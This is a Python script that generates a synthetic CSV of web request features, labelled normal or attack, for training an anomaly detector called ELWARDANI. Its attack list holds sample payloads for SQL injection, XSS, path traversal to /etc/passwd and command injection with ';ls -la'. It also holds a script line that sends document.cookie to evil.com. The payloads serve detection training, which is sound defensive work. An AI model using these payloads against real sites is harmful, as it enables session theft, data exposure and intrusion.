"""
Dataset generator for ELWARDANI Anomaly Detection System.
Produces a clean, plain-text UTF-8 CSV (never gzip-compressed).

Run once before starting the server:
    python generate_dataset.py
"""

import pandas as pd
import random


def generate_web_traffic(num_normal: int = 1500, num_anomalies: int = 200) -> None:
    data = []

    # Normal traffic
    normal_paths = [
        "/api/users",
        "/home",
        "/dashboard",
        "/login",
        "/api/data?id=10",
        "/profile/settings",
    ]
    methods = ["GET", "POST", "PUT", "DELETE"]

    for _ in range(num_normal):
        method  = random.choices(methods, weights=[70, 20, 5, 5])[0]
        url     = random.choice(normal_paths)
        content = (
            ""
            if method in ["GET", "DELETE"]
            else "{'user_id': 123, 'action': 'update'}"
        )

        url_length    = len(url)
        content_len   = len(content)
        special_chars = sum(not c.isalnum() for c in url)
        digits        = sum(c.isdigit() for c in url)
        method_code   = {"GET": 1, "POST": 2, "PUT": 3, "DELETE": 4}.get(method, 0)

        data.append([url_length, content_len, special_chars, digits, method_code, 0])

    # Attack / anomalous traffic
    attack_payloads = [
        "/api/data?id=1 OR 1=1",
        "/page?name=<script>alert(1)</script>",
        "/download?file=../../etc/passwd",
        "/ping?host=127.0.0.1;ls -la",
        "/login?user=admin'--",
        "/search?q=UNION SELECT username, password FROM users",
    ]

    for _ in range(num_anomalies):
        method  = random.choice(methods)
        url     = random.choice(attack_payloads)
        content = (
            "{'payload': '<script>fetch(\"http://evil.com?c=\"+document.cookie)</script>'}"
            if method in ["POST", "PUT"]
            else ""
        )

        url_length    = len(url)
        content_len   = len(content)
        special_chars = sum(not c.isalnum() for c in url)
        digits        = sum(c.isdigit() for c in url)
        method_code   = {"GET": 1, "POST": 2, "PUT": 3, "DELETE": 4}.get(method, 0)

        data.append([url_length, content_len, special_chars, digits, method_code, 1])

    columns = [
        "url_length",
        "content_length",
        "special_chars_in_url",
        "digits_in_url",
        "method_code",
        "is_anomaly",
    ]
    df = pd.DataFrame(data, columns=columns)
    df = df.sample(frac=1).reset_index(drop=True)

    # Always write as plain UTF-8 CSV
    df.to_csv("dataset.csv", index=False, encoding="utf-8", compression=None)

    total    = len(df)
    n_normal = int((df["is_anomaly"] == 0).sum())
    n_attack = int((df["is_anomaly"] == 1).sum())
    print(f"dataset.csv written -- {total} rows  |  {n_normal} normal  |  {n_attack} attacks")
    print("Encoding: plain UTF-8 CSV (no compression)")


if __name__ == "__main__":
    generate_web_traffic()